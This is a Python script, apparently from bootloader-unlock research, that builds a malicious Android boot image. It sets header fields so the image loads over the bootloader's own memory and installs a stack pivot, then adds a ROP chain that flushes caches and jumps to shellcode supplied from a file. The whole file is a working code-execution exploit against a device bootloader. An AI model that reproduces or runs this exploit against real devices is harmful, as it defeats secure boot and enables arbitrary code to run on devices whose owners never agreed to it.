import sys
import struct

base = 0x4BD00000

# 0x0000000000050132 : pop {r0, r1, r2, r3, r6, r7, pc}
pop_r0_r1_r2_r3_r6_r7_pc = base + 0x50132|1
# 0x0000000000018422 : pop {pc}
pop_pc = base + 0x18422|1
# 0x0000000000025e9a : blx r3 ; movs r0, #0 ; pop {r3, pc}
blx_r3_pop_r3 = base + 0x25e9a|1

cache_func = 0x4BD24C90

test = 0x4BD00177 # prints "Error, the pointer of pidme_data is NULL."

inject_addr = 0x4BD5C000
inject_sz = 0x1000

shellcode_addr = inject_addr + 0x100
shellcode_sz = 0x200 # TODO: check size

# ldmda   r3, {r2, r3, r4, r5, r8, fp, sp, lr, pc}
pivot = 0x4BD43320

def main():
    with open(sys.argv[1], "rb") as fin:
        orig = fin.read(0x400)
        fin.seek(0x800)
        orig += fin.read()

    hdr = bytes.fromhex("414E44524F494421")
    hdr += struct.pack("<II", inject_sz, inject_addr - 0x10)
    hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
    hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
    hdr += b"\x00" * 0xE
    # hdr += b"\x00" * 0x10 # TODO: this corresponds to inject_addr - 0x10 - fix this hack!
    hdr += struct.pack("<II", inject_addr + 0x40, pivot) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
    hdr += b"\x00" * 0x1C
    hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc

    hdr += b"\x00" * 0xC

    # clean dcache, flush icache, then jump to payload
    chain = [
        pop_r0_r1_r2_r3_r6_r7_pc,
        shellcode_addr, # r0
        shellcode_sz,   # r1
        0xDEAD,         # r2
        cache_func,         # r3
        0xDEAD,         # r6
        0xDEAD,         # r7

        blx_r3_pop_r3,
        0xDEAD,

        shellcode_addr
    ]
    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
    hdr += chain_bin

    want_len = shellcode_addr - inject_addr + 0x40 + 0x10
    hdr += b"\x00" * (want_len - len(hdr))

    with open(sys.argv[2], "rb") as fin:
        shellcode = fin.read()

    if len(shellcode) > shellcode_sz:
        raise RuntimeError("shellcode too big!")

    hdr += shellcode

    hdr += b"\x00" * (0x400 - len(hdr))
    hdr += orig

    with open(sys.argv[3], "wb") as fout:
        fout.write(hdr)


if __name__ == "__main__":
    main()
